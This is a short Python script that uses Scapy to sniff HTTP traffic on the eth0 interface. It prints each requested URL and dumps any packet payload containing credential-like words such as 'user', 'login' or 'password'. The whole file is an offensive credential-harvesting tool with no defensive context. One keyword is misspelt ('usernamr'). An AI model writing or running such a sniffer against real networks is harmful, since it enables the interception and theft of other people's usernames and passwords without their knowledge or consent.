#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def psniff(interface):
    scapy.sniff(iface=interface, store=False, prn=see_packets)
def see_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        URL = "http://www." + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(URL)
        if packet.haslayer(scapy.Raw):
            info = packet[scapy.Raw].load                     #uname&password sent in load filed in Raw layer
            names = ["usernamr", "user", "login", "email", "uname", "password", "pass", "passwd"]
            for word in names:
                if word in info:
                    print("\n###################\n")
                    print(info)
                    print("\n###################\n")
                    break

psniff("eth0")